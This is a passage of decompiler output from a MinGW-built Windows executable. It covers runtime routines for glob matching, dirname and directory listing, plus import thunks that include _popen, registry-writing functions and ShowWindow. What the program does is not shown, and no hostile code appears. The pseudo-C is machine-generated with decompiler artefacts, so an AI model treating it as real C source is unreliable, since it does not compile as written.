} while (cVar5 != '\0');
LAB_004033c9:
*(char **)((int)ppiVar20 + iVar11 + iVar8) = pcVar17;
*(undefined4 )((int)ppiVar20 + iVar11 + iVar8 + -4) = 0x4033d1;
pcVar12 = _strdup((char **)((int)ppiVar20 + iVar11 + iVar8));
ppcVar15 = (char **)local_54;
if (pcVar12 == (char *)0x0) {
local_38 = (char *)0x3;
pvVar7 = extraout_ECX_04;
goto LAB_00403300;
}
local_38 = (char *)((uint)local_38 & (local_38 == (char *)0x2) - 1);
if ((local_34 & 0x40) == 0) {
if (local_4c == (undefined4 *)0x0) {
*(undefined4 *)((int)ppiVar20 + iVar8) = 0xc;
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x4038c1;
puVar14 = (undefined4 )_malloc((size_t *)((int)ppiVar20 + iVar8));
pvVar7 = extraout_ECX_09;
ppcVar15 = (char **)local_54;
if (puVar14 == (undefined4 *)0x0) goto LAB_00403300;
puVar14[2] = pcVar12;
puVar14[1] = 0;
*puVar14 = 0;
pvVar7 = extraout_ECX_09;
}
else {
uVar6 = local_34 & 0x4000;
local_50 = puVar10;
puVar14 = local_4c;
do {
puVar18 = puVar14;
uVar1 = puVar18[2];
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined4 *)((int)ppiVar20 + iVar8 + 4) = uVar1;
if (uVar6 == 0) {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x40343a;
puVar13 = (undefined )
_stricoll((char **)((int)ppiVar20 + iVar8),
*(char **)((int)ppiVar20 + iVar8 + 4));
puVar14 = (undefined4 *)*puVar18;
puVar2 = (undefined4 *)puVar18[1];
puVar10 = local_50;
}
else {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x403418;
puVar13 = (undefined )
_strcoll((char **)((int)ppiVar20 + iVar8),
*(char **)((int)ppiVar20 + iVar8 + 4));
puVar14 = (undefined4 *)*puVar18;
puVar2 = (undefined4 *)puVar18[1];
puVar10 = local_50;
}
if (0 < (int)puVar13) {
puVar14 = puVar2;
}
local_50 = puVar10;
} while (puVar14 != (undefined4 *)0x0);
local_50 = (undefined4 *)puVar13;
*(undefined4 *)((int)ppiVar20 + iVar8) = 0xc;
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x40345b;
puVar14 = (undefined4 )_malloc((size_t *)((int)ppiVar20 + iVar8));
pvVar7 = extraout_ECX_05;
ppcVar15 = (char **)local_54;
if (puVar14 == (undefined4 *)0x0) goto LAB_00403300;
puVar14[2] = pcVar12;
puVar14[1] = 0;
*puVar14 = 0;
if (0 < (int)local_50) {
puVar18[1] = puVar14;
pvVar7 = extraout_ECX_05;
goto LAB_00403300;
}
*puVar18 = puVar14;
pvVar7 = extraout_ECX_05;
if (local_4c != (undefined4 *)0x0) goto LAB_00403300;
}
local_4c = puVar14;
ppcVar15 = (char **)local_54;
goto LAB_00403300;
}
pvVar7 = param_3;
if (param_3 != (void *)0x0) {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x403845;
FUN_00403080(param_3,(int)param_3);
pvVar7 = extraout_ECX_08;
ppcVar15 = (char **)local_54;
}
}
}
goto LAB_00403300;
}
*ppiVar20 = puVar10;
ppiVar20[-1] = (int *)0x40372b;
___mingw_closedir(*ppiVar20);
if (local_4c != (undefined4 *)0x0) {
ppiVar20[-1] = (int *)0x40373d;
FUN_004030e0(extraout_ECX_07,(int)param_3);
}
}
piVar25 = local_48;
piVar19 = local_48 + 1;
*ppiVar20 = (int *)*local_48;
ppiVar20[-1] = (int *)0x40374e;
_free(*ppiVar20);
iVar8 = piVar25[1];
ppvVar4 = ppiVar20;
if (iVar8 == 0) goto LAB_0040386b;
if (local_38 == (char *)0x1) goto LAB_004037a6;
local_48 = piVar19;
ppcVar15 = (char **)ppiVar20;
goto LAB_004032b9;
}
LAB_004037ca:
*ppiVar20 = local_48;
ppiVar20[-1] = (int *)0x4037d5;
_free(*ppiVar20);
return (uint)local_38;
while (iVar8 = iVar8 + -1, iVar8 != 0) {
LAB_004035d0:
cVar5 = pcVar24[1];
pcVar12 = pcVar24 + 1;
if (cVar5 == '\x7f') {
cVar5 = pcVar24[2];
pcVar24 = pcVar12;
while( true ) {
if (cVar5 == '\0') goto LAB_00403670;
cVar5 = pcVar24[2];
pcVar12 = pcVar24 + 2;
if (cVar5 != '\x7f') break;
cVar5 = pcVar24[3];
pcVar24 = pcVar12;
}
}
pcVar24 = pcVar12;
if (cVar5 == '{') {
iVar8 = iVar8 + 1;
goto LAB_004035d0;
}
if (cVar5 != '}') {
if (cVar5 == '\0') {
LAB_00403670:
*pcVar22 = '\0';
return 1;
}
goto LAB_004035d0;
}
}
LAB_00403613:
pcVar24 = pcVar12 + 1;
cVar5 = pcVar12[1];
while( true ) {
pcVar24 = pcVar24 + 1;
*pcVar22 = cVar5;
if (cVar5 == '\0') break;
cVar5 = *pcVar24;
pcVar22 = pcVar22 + 1;
}
*(void **)(&stack0xffffff84 + iVar11) = param_3;
uVar6 = local_34;
pcVar3 = local_40;
uVar23 = local_34 | 1;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403649;
uVar6 = FUN_00403130(pcVar3,uVar6,(void **)(&stack0xffffff84 + iVar11));
local_34 = uVar23;
if (uVar6 == 1) {
return 1;
}
if (*pcVar17 != ',') {
return uVar6;
}
goto LAB_00403515;
}
// WARNING: Unable to track spacebase fully for stack
uint __cdecl ___mingw_glob(char *param_1,uint param_2,undefined *param_3,char **param_4)
{
char cVar1;
int iVar2;
undefined *puVar3;
uint uVar4;
char *pcVar5;
undefined4 uStackY_40;
char acStack_38 [20];
uint local_24;
undefined *local_20;
if ((param_4 != (char **)0x0) && ((param_2 & 2) == 0)) {
param_4[3] = (char *)0x0;
}
if (*param_4 != ""glob-1.0-mingw32"") {
uStackY_40 = 0x4039ed;
FUN_00402b30();
*param_4 = ""glob-1.0-mingw32"";
}
uStackY_40 = 0x403a02;
local_24 = FUN_00403130(param_3,param_2,param_4);
if ((local_24 == 2) && ((param_2 & 0x10) != 0)) {
uStackY_40 = 0x403a33;
pcVar5 = param_1;
local_20 = &stack0xffffffc4;
_strlen(param_1);
uStackY_40 = 0x403a41;
uVar4 = ___chkstk_ms((char)pcVar5);
iVar2 = -uVar4;
pcVar5 = acStack_38 + iVar2;
do {
while (cVar1 = *param_1, cVar1 == '\x7f') {
cVar1 = param_1[1];
param_1 = param_1 + 2;
*pcVar5 = cVar1;
pcVar5 = pcVar5 + 1;
if (cVar1 == '\0') goto LAB_00403a78;
}
param_1 = param_1 + 1;
*pcVar5 = cVar1;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
LAB_00403a78:
*(char **)(&stack0xffffffc4 + iVar2) = acStack_38 + iVar2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x403a83;
pcVar5 = _strdup((char **)(&stack0xffffffc4 + iVar2));
puVar3 = local_20;
uVar4 = local_24;
if (pcVar5 != (char *)0x0) {
local_20 = (undefined *)local_24;
*(undefined4 *)(puVar3 + -4) = 0x403a9b;
FUN_00403080(uVar4,(int)param_4);
local_24 = (uint)local_20;
}
}
return local_24;
}
// WARNING: Unable to track spacebase fully for stack
char * __cdecl ___mingw_dirname(char *param_1)
{
short *psVar1;
int iVar2;
char *_Src;
size_t sVar3;
uint uVar4;
short *psVar5;
short *psVar6;
short *psVar7;
short *psVar8;
short sVar9;
undefined4 extraout_EDX;
undefined4 uStackY_40;
undefined uVar10;
short asStack_30 [2];
size_t local_2c;
undefined *local_28;
short local_22;
short *local_20;
uStackY_40 = 0x403b2d;
_Src = _setlocale(2,(char *)0x0);
if (_Src != (char *)0x0) {
uStackY_40 = 0x403b3b;
_Src = _strdup(_Src);
}
uStackY_40 = 0x403b51;
_setlocale(2,"""");
if ((param_1 == (char *)0x0) || (*param_1 == '\0')) {
LAB_00403b60:
uStackY_40 = 0x403b7c;
sVar3 = _wcstombs((char *)0x0,L""."",0);
uStackY_40 = 0x403b90;
_bss = (char *)_realloc(_bss,sVar3 + 1);
uStackY_40 = 0x403ba9;
_wcstombs(_bss,L""."",sVar3 + 1);
uStackY_40 = 0x403bb9;
_setlocale(2,_Src);
uStackY_40 = 0x403bc1;
_free(_Src);
return _bss;
}
uVar10 = 0;
uStackY_40 = 0x403bef;
local_28 = &stack0xffffffc4;
_mbstowcs((wchar_t *)0x0,param_1,0);
uStackY_40 = 0x403c00;
uVar4 = ___chkstk_ms(uVar10);
iVar2 = -uVar4;
*(undefined4 *)(&stack0xffffffcc + iVar2) = extraout_EDX;
psVar1 = (short *)((int)asStack_30 + iVar2);
*(short **)(&stack0xffffffc4 + iVar2) = psVar1;
*(char **)(&stack0xffffffc8 + iVar2) = param_1;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403c19;
sVar3 = _mbstowcs((wchar_t **)(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
local_2c = sVar3;
psVar1[sVar3] = 0;
local_22 = *psVar1;
local_20 = psVar1;
if (1 < sVar3) {
if ((local_22 == 0x2f) || (local_22 == 0x5c)) {
if ((local_22 == *(short )((int)asStack_30 + iVar2 + 2)) &&
((short *)((int)&local_2c + iVar2) == 0)) {
*(char **)(&stack0xffffffc8 + iVar2) = _Src;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x403e80;
_setlocale((int )(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2));
*(char **)(&stack0xffffffc4 + iVar2) = _Src;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403e88;
_free((void **)(&stack0xffffffc4 + iVar2));
return param_1;
}
}
else if ((short *)((int)asStack_30 + iVar2 + 2) == 0x3a) {
local_20 = (short *)((int)&local_2c + iVar2);
local_22 = *(short *)((int)&local_2c + iVar2);
}
}
psVar6 = local_20;
psVar8 = local_20;
psVar7 = local_20;
sVar9 = local_22;
if (local_22 == 0) goto LAB_00403b60;
do {
while ((psVar5 = psVar8, sVar9 == 0x2f || (sVar9 == 0x5c))) {
sVar9 = *psVar5;
if (sVar9 != 0x2f) goto LAB_00403ca1;
do {
do {
psVar5 = psVar5 + 1;
sVar9 = *psVar5;
} while (sVar9 == 0x2f);
LAB_00403ca1:
} while (sVar9 == 0x5c);
if (sVar9 == 0) goto LAB_00403cba;
psVar8 = psVar5 + 1;
psVar7 = psVar5;
sVar9 = psVar5[1];
if (psVar5[1] == 0) goto LAB_00403cba;
}
psVar8 = psVar5 + 1;
sVar9 = psVar5[1];
} while (psVar5[1] != 0);
LAB_00403cba:
if (psVar7 <= local_20) {
if ((local_22 != 0x2f) && (local_22 != 0x5c)) {
*local_20 = 0x2e;
}
psVar6[1] = 0;
*(undefined4 *)(&stack0xffffffcc + iVar2) = 0;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 0;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403d08;
sVar3 = _wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
*(short **)(&stack0xffffffc8 + iVar2) = (short *)(sVar3 + 1);
local_20 = (short *)(sVar3 + 1);
*(char **)(&stack0xffffffc4 + iVar2) = _bss;
*(undefined4 *)((int)&uStackY_40 + iVar2) = 0x403d1f;
param_1 = (char )_realloc((void **)(&stack0xffffffc4 + iVar2),
*(size_t *)(&stack0xffffffc8 + iVar2));
psVar6 = local_20;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(char **)(&stack0xffffffc4 + iVar2) = param_1;
*(short **)(&stack0xffffffcc + iVar2) = psVar6;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403d39;
_bss = param_1;
_wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
goto LAB_00403e00;
}
do {
psVar6 = psVar7 + -1;
if (psVar6 <= local_20) {
if ((local_20 == psVar6) &&
((((local_22 == 0x2f || (local_22 == 0x5c)) && (*psVar7 == local_22)) &&
((psVar7[1] != 0x2f && (psVar7[1] != 0x5c)))))) {
psVar6 = psVar7;
}
break;
}
psVar8 = psVar7 + -1;
psVar7 = psVar6;
} while ((*psVar8 == 0x2f) || (*psVar8 == 0x5c));
psVar6[1] = 0;
sVar9 = *psVar1;
psVar7 = psVar1;
psVar6 = psVar1;
psVar8 = psVar1;
if ((sVar9 == 0x2f) || (sVar9 == 0x5c)) {
do {
do {
psVar7 = psVar7 + 1;
} while (*psVar7 == 0x2f);
} while (psVar7 == 0x5c);
if ((int)psVar7 - (int)psVar1 < 6) goto LAB_00403e8d;
}
else {
LAB_00403e8d:
if ((short *)((int)asStack_30 + iVar2 + 2) == sVar9) {
sVar9 = *psVar7;
psVar6 = psVar7;
psVar8 = psVar7;
}
}
while (psVar7 = psVar6, psVar6 = psVar8, sVar9 != 0) {
while( true ) {
psVar8 = psVar6 + 1;
*psVar6 = sVar9;
psVar6 = psVar7;
if ((sVar9 == 0x2f) || (psVar6 = psVar7 + 1, *psVar7 == 0x5c)) break;
sVar9 = psVar7[1];
psVar7 = psVar6;
psVar6 = psVar8;
if (sVar9 == 0) goto LAB_00403dd9;
}
sVar9 = *psVar6;
if ((sVar9 == 0x5c) || (sVar9 == 0x2f)) {
do {
do {
psVar6 = psVar6 + 1;
sVar9 = *psVar6;
} while (sVar9 == 0x2f);
} while (sVar9 == 0x5c);
}
}
LAB_00403dd9:
sVar3 = local_2c;
*psVar8 = 0;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(size_t *)(&stack0xffffffcc + iVar2) = sVar3;
*(char **)(&stack0xffffffc4 + iVar2) = param_1;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403df4;
sVar3 = _wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
if (sVar3 != 0xffffffff) {
param_1[sVar3] = '\0';
}
LAB_00403e00:
*(char **)(&stack0xffffffc8 + iVar2) = _Src;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x403e10;
_setlocale((int )(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2));
*(char **)(&stack0xffffffc4 + iVar2) = _Src;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x403e18;
_free((void **)(&stack0xffffffc4 + iVar2));
return param_1;
}
HANDLE __fastcall _text(undefined4 param_1,int param_2)
{
char cVar1;
ushort uVar2;
LPCSTR in_EAX;
HANDLE pvVar3;
DWORD *pDVar4;
DWORD DVar5;
int *piVar6;
char *pcVar7;
_WIN32_FIND_DATAA local_14c;
pvVar3 = _FindFirstFileA_8(in_EAX,&local_14c);
if (pvVar3 == (HANDLE)0xffffffff) {
pDVar4 = (DWORD *)__errno();
DVar5 = _GetLastError_0();
*pDVar4 = DVar5;
if (DVar5 == 3) {
piVar6 = __errno();
*piVar6 = 2;
}
else {
piVar6 = __errno();
if (*piVar6 == 0x10b) {
piVar6 = __errno();
*piVar6 = 0x14;
}
else {
piVar6 = __errno();
if (*piVar6 != 2) {
piVar6 = __errno();
*piVar6 = 0x16;
}
}
}
}
else {
pcVar7 = (char *)(param_2 + 0xc);
*(undefined2 *)(param_2 + 6) = 0;
uVar2 = 0;
while (cVar1 = local_14c.cFileName[uVar2], *pcVar7 = cVar1, cVar1 != '\0') {
uVar2 = *(short *)(param_2 + 6) + 1;
*(ushort *)(param_2 + 6) = uVar2;
pcVar7 = pcVar7 + (uVar2 < 0x104);
}
if ((local_14c.dwFileAttributes & 0xffffff58) < 0x11) {
*(DWORD *)(param_2 + 8) = local_14c.dwFileAttributes & 0xffffff58;
return pvVar3;
}
*(undefined4 *)(param_2 + 8) = 0x18;
}
return pvVar3;
}
BOOL __fastcall FUN_00403fe0(undefined4 param_1,int param_2)
{
char cVar1;
ushort uVar2;
HANDLE in_EAX;
BOOL BVar3;
DWORD DVar4;
int *piVar5;
char *pcVar6;
_WIN32_FIND_DATAA local_14c;
BVar3 = _FindNextFileA_8(in_EAX,&local_14c);
if (BVar3 == 0) {
DVar4 = _GetLastError_0();
if (DVar4 != 0x12) {
piVar5 = __errno();
*piVar5 = 2;
return 0;
}
}
else {
pcVar6 = (char *)(param_2 + 0xc);
*(undefined2 *)(param_2 + 6) = 0;
uVar2 = 0;
while (cVar1 = local_14c.cFileName[uVar2], *pcVar6 = cVar1, cVar1 != '\0') {
uVar2 = *(short *)(param_2 + 6) + 1;
*(ushort *)(param_2 + 6) = uVar2;
pcVar6 = pcVar6 + (uVar2 < 0x104);
}
if (0x10 < (local_14c.dwFileAttributes & 0xffffff58)) {
*(undefined4 *)(param_2 + 8) = 0x18;
return BVar3;
}
*(DWORD *)(param_2 + 8) = local_14c.dwFileAttributes & 0xffffff58;
}
return BVar3;
}
undefined4 * __cdecl ___mingw_opendir(char *param_1)
{
int iVar1;
char *pcVar2;
uint *puVar3;
undefined4 *_Memory;
HANDLE pvVar4;
int *piVar5;
undefined4 extraout_ECX;
uint uVar6;
uint uVar7;
uint *puVar8;
char local_120;
if (param_1 == (char *)0x0) {
piVar5 = __errno();
_Memory = (undefined4 *)0x0;
*piVar5 = 0x16;
}
else if (*param_1 == '\0') {
piVar5 = __errno();
_Memory = (undefined4 *)0x0;
*piVar5 = 2;
}
else {
__fullpath(&local_120,param_1,0x104);
puVar8 = (uint *)&local_120;
if (local_120 == '\0') {
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
pcVar2 = (char *)((int)puVar8 +
((-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120));
}
else {
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
pcVar2 = (char *)((int)puVar8 +
((-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120));
if (((&stack0xfffffedc)[(int)(pcVar2 + 3)] != '/') &&
((&stack0xfffffedc)[(int)(pcVar2 + 3)] != '\\')) {
*(undefined2 *)((int)&local_120 + (int)pcVar2) = 0x5c;
pcVar2 = pcVar2 + 1;
}
}
*(undefined2 *)((int)&local_120 + (int)pcVar2) = 0x2a;
puVar8 = (uint *)&local_120;
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
iVar1 = (-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120;
_Memory = (undefined4 *)_malloc((size_t)((int)puVar8 + iVar1 + 0x11c));
if (_Memory == (undefined4 *)0x0) {
piVar5 = __errno();
*piVar5 = 0xc;
}
else {
_memcpy(_Memory + 0x46,&local_120,(size_t)((int)puVar8 + iVar1 + 1));
pvVar4 = _text(extraout_ECX,(int)_Memory);
_Memory[0x44] = pvVar4;
if (pvVar4 == (HANDLE)0xffffffff) {
_free(_Memory);
_Memory = (undefined4 *)0x0;
}
else {
_Memory[0x45] = 0;
*_Memory = 0;
*(undefined2 *)(_Memory + 1) = 0x110;
}
}
}
return _Memory;
}
int __thiscall ___mingw_readdir(void *this,int param_1)
{
int iVar1;
BOOL BVar2;
int *piVar3;
if (param_1 == 0) {
piVar3 = __errno();
*piVar3 = 9;
param_1 = 0;
}
else {
iVar1 = *(int *)(param_1 + 0x114);
*(int *)(param_1 + 0x114) = iVar1 + 1;
if ((0 < iVar1) && (BVar2 = FUN_00403fe0(this,param_1), BVar2 == 0)) {
return 0;
}
}
return param_1;
}
undefined4 __cdecl ___mingw_closedir(void *param_1)
{
BOOL BVar1;
int *piVar2;
if ((param_1 != (void )0x0) &&
(BVar1 = _FindClose_4((HANDLE *)((int)param_1 + 0x110)), BVar1 != 0)) {
_free(param_1);
return 0;
}
piVar2 = __errno();
*piVar2 = 9;
return 0xffffffff;
}
void __cdecl ___mingw_rewinddir(int param_1)
{
BOOL BVar1;
int piVar2;
HANDLE pvVar3;
undefined4 extraout_ECX;
if ((param_1 != 0) && (BVar1 = _FindClose_4((HANDLE *)(param_1 + 0x110)), BVar1 != 0)) {
pvVar3 = _text(extraout_ECX,param_1);
*(HANDLE *)(param_1 + 0x110) = pvVar3;
if (pvVar3 == (HANDLE)0xffffffff) {
return;
}
*(undefined4 *)(param_1 + 0x114) = 0;
return;
}
piVar2 = __errno();
*piVar2 = 9;
return;
}
size_t __cdecl _wcstombs(char *_Dest,wchar_t *_Source,size_t _MaxCount)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404400. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = wcstombs(_Dest,_Source,_MaxCount);
return sVar1;
}
int __cdecl _vfprintf(FILE *_File,char *_Format,va_list _ArgList)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404408. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = vfprintf(_File,_Format,_ArgList);
return iVar1;
}
int __cdecl _tolower(int _C)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404410. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = tolower(_C);
return iVar1;
}
char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404418. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = strncpy(_Dest,_Source,_Count);
return pcVar1;
}
int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404420. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = strncmp(_Str1,_Str2,_MaxCount);
return iVar1;
}
size_t __cdecl _strlen(char *_Str)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404428. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = strlen(_Str);
return sVar1;
}
int __cdecl _strcoll(char *_Str1,char *_Str2)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404430. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = strcoll(_Str1,_Str2);
return iVar1;
}
char * __cdecl _strcat(char *_Dest,char *_Source)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404438. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = strcat(_Dest,_Source);
return pcVar1;
}
// WARNING: Unknown calling convention -- yet parameter storage is locked
void _signal(int param_1)
{
// WARNING: Could not recover jumptable at 0x00404440. Too many branches
// WARNING: Treating indirect jump as call
signal(param_1);
return;
}
char * __cdecl _setlocale(int _Category,char *_Locale)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404448. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = setlocale(_Category,_Locale);
return pcVar1;
}
void * __cdecl _realloc(void *_Memory,size_t _NewSize)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x00404450. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = realloc(_Memory,_NewSize);
return pvVar1;
}
int __cdecl _putc(int _Ch,FILE *_File)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404458. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = putc(_Ch,_File);
return iVar1;
}
void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x00404460. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = memset(_Dst,_Val,_Size);
return pvVar1;
}
void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x00404468. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = memcpy(_Dst,_Src,_Size);
return pvVar1;
}
size_t __cdecl _mbstowcs(wchar_t *_Dest,char *_Source,size_t _MaxCount)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404470. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = mbstowcs(_Dest,_Source,_MaxCount);
return sVar1;
}
void * __cdecl _malloc(size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x00404478. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = malloc(_Size);
return pvVar1;
}
size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404480. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = fwrite(_Str,_Size,_Count,_File);
return sVar1;
}
void __cdecl _free(void *_Memory)
{
// WARNING: Could not recover jumptable at 0x00404488. Too many branches
// WARNING: Treating indirect jump as call
free(_Memory);
return;
}
FILE * __cdecl _fopen(char *_Filename,char *_Mode)
{
FILE *pFVar1;
// WARNING: Could not recover jumptable at 0x00404490. Too many branches
// WARNING: Treating indirect jump as call
pFVar1 = fopen(_Filename,_Mode);
return pFVar1;
}
char * __cdecl _fgets(char *_Buf,int _MaxCount,FILE *_File)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404498. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = fgets(_Buf,_MaxCount,_File);
return pcVar1;
}
int __cdecl _fclose(FILE *_File)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004044a0. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = fclose(_File);
return iVar1;
}
void __cdecl _exit(int _Code)
{
// WARNING: Could not recover jumptable at 0x004044a8. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
exit(_Code);
return;
}
void * __cdecl _calloc(size_t _Count,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x004044b0. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = calloc(_Count,_Size);
return pvVar1;
}
void __cdecl _abort(void)
{
// WARNING: Could not recover jumptable at 0x004044b8. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
abort();
return;
}
int __cdecl __setmode(int _FileHandle,int _Mode)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004044c0. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _setmode(_FileHandle,_Mode);
return iVar1;
}
FILE * __cdecl __popen(char *_Command,char *_Mode)
{
FILE *pFVar1;
// WARNING: Could not recover jumptable at 0x004044c8. Too many branches
// WARNING: Treating indirect jump as call
pFVar1 = _popen(_Command,_Mode);
return pFVar1;
}
int __cdecl __isctype(int _C,int _Type)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004044d0. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _isctype(_C,_Type);
return iVar1;
}
char * __cdecl __fullpath(char *_FullPath,char *_Path,size_t _SizeInBytes)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x004044d8. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = _fullpath(_FullPath,_Path,_SizeInBytes);
return pcVar1;
}
int * __cdecl __errno(void)
{
int *piVar1;
// WARNING: Could not recover jumptable at 0x004044e0. Too many branches
// WARNING: Treating indirect jump as call
piVar1 = _errno();
return piVar1;
}
int __cdecl __chdir(char *_Path)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004044e8. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _chdir(_Path);
return iVar1;
}
void __cdecl __cexit(void)
{
// WARNING: Could not recover jumptable at 0x004044f0. Too many branches
// WARNING: Treating indirect jump as call
_cexit();
return;
}
void ___p__fmode(void)
{
// WARNING: Could not recover jumptable at 0x004044f8. Too many branches
// WARNING: Treating indirect jump as call
__p__fmode();
return;
}
void ___p__environ(void)
{
// WARNING: Could not recover jumptable at 0x00404500. Too many branches
// WARNING: Treating indirect jump as call
__p__environ();
return;
}
int __cdecl
___getmainargs(int *_Argc,char ***_Argv,char ***_Env,int _DoWildCard,_startupinfo *_StartInfo)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404508. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = __getmainargs(_Argc,_Argv,_Env,_DoWildCard,_StartInfo);
return iVar1;
}
LSTATUS _RegSetValueExA_24(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD dwType,BYTE *lpData,
DWORD cbData)
{
LSTATUS LVar1;
// WARNING: Could not recover jumptable at 0x00404510. Too many branches
// WARNING: Treating indirect jump as call
LVar1 = RegSetValueExA(hKey,lpValueName,Reserved,dwType,lpData,cbData);
return LVar1;
}
LSTATUS _RegOpenKeyA_12(HKEY hKey,LPCSTR lpSubKey,PHKEY phkResult)
{
LSTATUS LVar1;
// WARNING: Could not recover jumptable at 0x00404518. Too many branches
// WARNING: Treating indirect jump as call
LVar1 = RegOpenKeyA(hKey,lpSubKey,phkResult);
return LVar1;
}
LSTATUS _RegCloseKey_4(HKEY hKey)
{
LSTATUS LVar1;
// WARNING: Could not recover jumptable at 0x00404520. Too many branches
// WARNING: Treating indirect jump as call
LVar1 = RegCloseKey(hKey);
return LVar1;
}
BOOL _ShowWindow_8(HWND hWnd,int nCmdShow)
{
BOOL BVar1;
